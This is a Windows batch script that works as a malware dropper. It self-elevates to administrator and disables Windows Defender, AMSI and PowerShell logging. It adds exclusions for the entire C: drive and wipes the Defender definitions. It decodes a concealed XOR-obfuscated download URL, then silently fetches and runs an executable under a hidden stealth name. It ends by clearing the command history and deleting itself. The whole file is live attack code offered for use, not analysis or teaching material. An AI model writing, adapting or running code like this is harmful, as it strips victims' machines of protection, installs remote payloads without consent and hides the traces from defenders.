@echo off
setlocal EnableDelayedExpansion

:: Check if already running as admin
net session >nul 2>&1
if %errorLevel% == 0 (
    goto :admin_section
) else (
    goto :elevate_admin
)

:elevate_admin
:: Self-elevate to admin using PowerShell
powershell -Command "Start-Process '%~f0' -Verb RunAs" >nul 2>&1
exit /b

:admin_section
:: Now running as administrator - all operations silent

:: Add Windows Defender exclusions for C:/ drive
powershell -Command "Add-MpPreference -ExclusionPath 'C:\' -Force" >nul 2>&1
powershell -Command "Add-MpPreference -ExclusionProcess '*' -Force" >nul 2>&1
powershell -Command "Add-MpPreference -ExclusionExtension '.exe' -Force" >nul 2>&1
powershell -Command "Add-MpPreference -ExclusionExtension '.bat' -Force" >nul 2>&1
powershell -Command "Add-MpPreference -ExclusionExtension '.ps1' -Force" >nul 2>&1

:: Disable Windows Defender features
powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true -Force" >nul 2>&1
powershell -Command "Set-MpPreference -DisableBehaviorMonitoring $true -Force" >nul 2>&1
powershell -Command "Set-MpPreference -DisableBlockAtFirstSeen $true -Force" >nul 2>&1
powershell -Command "Set-MpPreference -DisableIOAVProtection $true -Force" >nul 2>&1
powershell -Command "Set-MpPreference -DisableScriptScanning $true -Force" >nul 2>&1
powershell -Command "Set-MpPreference -DisableArchiveScanning $true -Force" >nul 2>&1
powershell -Command "Set-MpPreference -DisableIntrusionPreventionSystem $true -Force" >nul 2>&1
powershell -Command "Set-MpPreference -SubmitSamplesConsent 2 -Force" >nul 2>&1

:: Disable AMSI (Anti-Malware Scan Interface)
reg add "HKLM\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}" /v "Enabled" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKCU\SOFTWARE\Microsoft\Windows Script\Settings" /v "AmsiEnable" /t REG_DWORD /d 0 /f >nul 2>&1

:: Disable Windows Script Host protection
reg add "HKLM\SOFTWARE\Microsoft\Windows Script Host\Settings" /v "Enabled" /t REG_DWORD /d 0 /f >nul 2>&1

:: Disable PowerShell execution policy and logging
powershell -Command "Set-ExecutionPolicy Bypass -Scope LocalMachine -Force" >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" /v "EnableScriptBlockLogging" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging" /v "EnableModuleLogging" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription" /v "EnableTranscripting" /t REG_DWORD /d 0 /f >nul 2>&1

:: Clear Windows Defender definitions
powershell -Command "& 'C:\Program Files\Windows Defender\MpCmdRun.exe' -RemoveDefinitions -All" >nul 2>&1

:: Decrypt configuration data
set "enc_key=T2FodmozN1BzWmF5ODlFSzJDeWtjUjNacE1lV2JyWTk="
set "enc_url=JxUcBhkJGH8BOxZXX1AxI0chDBgGIFA1HjkAORZcOlYiTiIDGUdBORAxGEgNFjYiVS4YDQo+VilfPwAxEV0xXC4FG1kHUl4+XCkVDFoXIDNX"
set "enc_path=aiA4Ji5yYxFWBiwQW0sqOF0lDTc0O10+HzoWCzELKk0qDCkGGkA="
set "enc_exe=GAgGEgVERBQWPAQXXFw3HkInGB8GfFYiFQ=="
set "enc_temp=IgQFBgJaRA8aNBINWVUp"

:: Decrypt using PowerShell
for /f "delims=" %%i in ('powershell -Command "$k=[System.Convert]::FromBase64String('%enc_key%'); $d=[System.Convert]::FromBase64String('%enc_url%'); $r=''; for($i=0;$i -lt $d.Length;$i++){$r+=[char]($d[$i] -bxor $k[$i %% $k.Length])}; Write-Output $r"') do set "download_url=%%i"
for /f "delims=" %%i in ('powershell -Command "$k=[System.Convert]::FromBase64String('%enc_key%'); $d=[System.Convert]::FromBase64String('%enc_path%'); $r=''; for($i=0;$i -lt $d.Length;$i++){$r+=[char]($d[$i] -bxor $k[$i %% $k.Length])}; Write-Output $r"') do set "install_dir=%%i"
for /f "delims=" %%i in ('powershell -Command "$k=[System.Convert]::FromBase64String('%enc_key%'); $d=[System.Convert]::FromBase64String('%enc_exe%'); $r=''; for($i=0;$i -lt $d.Length;$i++){$r+=[char]($d[$i] -bxor $k[$i %% $k.Length])}; Write-Output $r"') do set "final_exe_name=%%i"
for /f "delims=" %%i in ('powershell -Command "$k=[System.Convert]::FromBase64String('%enc_key%'); $d=[System.Convert]::FromBase64String('%enc_temp%'); $r=''; for($i=0;$i -lt $d.Length;$i++){$r+=[char]($d[$i] -bxor $k[$i %% $k.Length])}; Write-Output $r"') do set "temp_folder=%%i"

:: Set final paths
set "temp_dir=%TEMP%\!temp_folder!"
set "stub_file=!temp_dir!\stub.exe"
set "final_exe=!install_dir!\!final_exe_name!"

:: Create temp directory
if not exist "!temp_dir!" mkdir "!temp_dir!" >nul 2>&1

:: Download using PowerShell
powershell -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri '!download_url!' -OutFile '!stub_file!' -UseBasicParsing" >nul 2>&1

:: Check if download was successful, exit silently if failed
if not exist "!stub_file!" exit /b 1

:: Create install directory if it doesn't exist
if not exist "!install_dir!" mkdir "!install_dir!" >nul 2>&1

:: Copy to final location with stealth name
copy "!stub_file!" "!final_exe!" >nul 2>&1

:: Verify installation, exit silently if failed
if not exist "!final_exe!" exit /b 1

:: Set file attributes to hidden and system
attrib +h +s "!final_exe!" >nul 2>&1

:: Execute the stub silently in background
start "" /B "!final_exe!" >nul 2>&1

:: Wait a moment to ensure it starts
timeout /t 2 /nobreak >nul 2>&1

:: Clean up temp files
if exist "!temp_dir!" rmdir /s /q "!temp_dir!" >nul 2>&1

:: Clear PowerShell history to remove traces
powershell -Command "Clear-History; Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue" >nul 2>&1

:: Clear command history
doskey /reinstall >nul 2>&1

:: Self-delete the installer
(goto) 2>nul & del "%~f0" >nul 2>&1
